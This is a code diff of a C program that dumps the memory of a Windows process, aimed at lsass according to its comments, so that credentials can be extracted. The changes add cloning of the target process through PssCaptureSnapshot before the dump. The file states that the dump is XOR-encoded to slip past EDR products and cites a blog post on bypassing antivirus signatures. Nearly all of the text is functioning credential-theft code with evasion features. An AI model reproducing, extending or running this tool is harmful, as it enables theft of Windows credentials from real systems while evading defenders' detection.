@@ -1,14 +1,16 @@
 /* Program to dump a process's memory to memory to avoid some problems with
  * dumping directly to disk.
- * This has been tested on Windows 7, 8.1 and Windows 10.
+ * This has been tested on Windows 8.1 and Windows 10.
  * Due to a dependency DbgHelp 6.5, Windows XP, and Windows server 2003 will not work.
+ * Furthermore, to support process cloning before dumping lsass, 64 bit is required.
  * 
  * The created dump is inverted e.g., each byte is XOR:ed with 0xFF to avoid
  * some EDRs.
  * 
  * */
 #include <sys/types.h>
-#define _WIN32_WINNT 0x0602
+#undef _WIN32_WINNT // Undefine variable set to 0x0502 by MinGW
+#define _WIN32_WINNT 0x0603 // Windows 8.1
 #include <windows.h>
 #include <tlhelp32.h>
 #include "minidumpapiset.h"
@@ -16,13 +18,15 @@
 #include <stdlib.h>
 #include <string.h>
 #include <time.h>
+#include "processsnapshot.h"
 #include "processdumper.h"
 #pragma comment (lib, "Dbghelp.lib")
 
 /*
  * The inspiration for this project came from a blogpost by https://www.ired.team:
  * https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-process-passwords-without-mimikatz-minidumpwritedump-av-signature-bypass
- * And also ideas for how to avoid detection by AV/EDR
+ * And also some ideas from Microsoft's documentation at:
+ * https://docs.microsoft.com/en-us/previous-versions/windows/desktop/proc_snap/export-a-process-snapshot-to-a-file
  */
 
 void reportBytesProcess(unsigned char *, DWORD);
@@ -47,6 +51,7 @@ BOOL CALLBACK minidumpCallback(
         callbackOutput->Status = S_FALSE;
         if (debug) {
             printf("[Debug] Received IoStartCallback\n");
+            //printf("[Debug] Redirecting IO through callbacks\n");
         }
         break;
     case IoWriteAllCallback:
@@ -85,7 +90,12 @@ BOOL CALLBACK minidumpCallback(
         callbackOutput->Status = S_OK;
         break;
     case IoFinishCallback:
+        printf("[Debug] Finished dumping process in IoFinishCallback\n");
         callbackOutput->Status = S_OK;
+        break;
+    case IsProcessSnapshotCallback:
+        // Instruct MiniDumpWriteDump that the handle is a PSSsnapshot handle, not a process handle.
+        callbackOutput->Status = S_FALSE;
         break;
     default:
         break;
@@ -99,10 +109,9 @@ void DumpProcess(int debugArg, char *targetProcess) {
     
     HANDLE processHandle = NULL;
     HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (debug) {
-        printf("[Debug] Created snapshot\n");
-    }
-    char *processName = "";
+//    if (debug) {
+//        printf("[Debug] Created snapshot\n");
+//    }
     PROCESSENTRY32 processEntry;
     processEntry.dwSize = sizeof(PROCESSENTRY32);
     dumpBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dumpBufferSize);
@@ -117,15 +126,15 @@ void DumpProcess(int debugArg, char *targetProcess) {
     }
     if (debug) {
         printf("[Debug] Allocated memory for the memory dump\n");
+        printf("[Debug] Attempting to find PID of %s\n", targetProcess);
     }
 
     if (Process32First(snapshot, &processEntry)) {
         do {
-            if (strcmp(processName, targetProcess) == 0) {
+            if(strcmp(targetProcess, processEntry.szExeFile) == 0) {
                 processPID = processEntry.th32ProcessID;
                 break;
             }
-            processName = processEntry.szExeFile;
         } while(Process32Next(snapshot, &processEntry));
 
         if(processPID == -1) {
@@ -145,9 +154,22 @@ void DumpProcess(int debugArg, char *targetProcess) {
         printf("[Debug] Attempting to open handle to the (%s) process\n", targetProcess);
     }
     processHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, processPID);
-    if (debug) {
-        printf("[Debug] Opened handle to the (%s) process\n", targetProcess);
+    if (processHandle == NULL) {
+        if (debug) {
+            char buf[256];
+            FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM|FORMAT_MESSAGE_IGNORE_INSERTS,NULL,GetLastError(), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),buf,(sizeof(buf)/sizeof(wchar_t)), NULL);
+            printf("[Debug] Failed to open process handle with error: %s\n", buf);
+        }
+        HeapFree(GetProcessHeap(), 0, dumpBuffer);
+        return;
     }
+
+//    if (debug) {
+//        printf("[Debug] Opened handle to the (%s) process\n", targetProcess);
+//    }
+
+    DWORD flags = (DWORD)PSS_CAPTURE_VA_CLONE | PSS_CAPTURE_HANDLES | PSS_CAPTURE_HANDLE_NAME_INFORMATION | PSS_CAPTURE_HANDLE_BASIC_INFORMATION | PSS_CAPTURE_HANDLE_TYPE_SPECIFIC_INFORMATION | PSS_CAPTURE_HANDLE_TRACE | PSS_CAPTURE_THREADS | PSS_CAPTURE_THREAD_CONTEXT | PSS_CAPTURE_THREAD_CONTEXT_EXTENDED | PSS_CREATE_BREAKAWAY | PSS_CREATE_BREAKAWAY_OPTIONAL | PSS_CREATE_USE_VM_ALLOCATIONS | PSS_CREATE_RELEASE_SECTION;
+    HANDLE clonedHandle = NULL;
 
     MINIDUMP_CALLBACK_INFORMATION callbackInfo;
     ZeroMemory(&callbackInfo, sizeof(MINIDUMP_CALLBACK_INFORMATION));
@@ -155,10 +177,25 @@ void DumpProcess(int debugArg, char *targetProcess) {
     callbackInfo.CallbackParam = NULL;
 
     if (debug) {
+        printf("[Debug] Attempting to clone the (%s) process\n", targetProcess);
+    }
+
+    if(PssCaptureSnapshot(processHandle, (PSS_CAPTURE_FLAGS)flags, CONTEXT_ALL, (HPSS*)&clonedHandle) != ERROR_SUCCESS) {
+        if (debug) {
+            char buf[256];
+            FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM|FORMAT_MESSAGE_IGNORE_INSERTS,NULL,GetLastError(), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),buf,(sizeof(buf)/sizeof(wchar_t)), NULL);
+            printf("[Debug] Failed to clone process with error: %s\n", buf);
+        }
+        CloseHandle(processHandle);
+        HeapFree(GetProcessHeap(), 0, dumpBuffer);
+        return;
+    }
+
+    if (debug) {
         printf("[Debug] Attempting to dump the (%s) process\n", targetProcess);
     }
 
-    BOOL isDumped = MiniDumpWriteDump(processHandle, processPID, NULL, MiniDumpWithFullMemory, NULL, NULL, &callbackInfo);
+    BOOL isDumped = MiniDumpWriteDump(clonedHandle, processPID, NULL, MiniDumpWithFullMemory, NULL, NULL, &callbackInfo);
     if (isDumped) {
         reportBytesProcess(dumpBuffer, bytesRead);
     } else {
@@ -168,6 +205,7 @@ void DumpProcess(int debugArg, char *targetProcess) {
         printf("[Debug] Freeing allocated memory\n");
     }
     HeapFree(GetProcessHeap(), 0, dumpBuffer);
+    PssFreeSnapshot(GetCurrentProcess(), (HPSS)clonedHandle);
 }
 
 FILE *outfile = NULL;
@@ -222,7 +260,6 @@ int main(int argc, char *argv[]) {
     if ((outfile = fopen(filename, "wb")) == NULL) // will replace existing files
     {
         printf("Failed to open file (%s)\n", filename);
-        // Free memory
         return -1;
     }
 
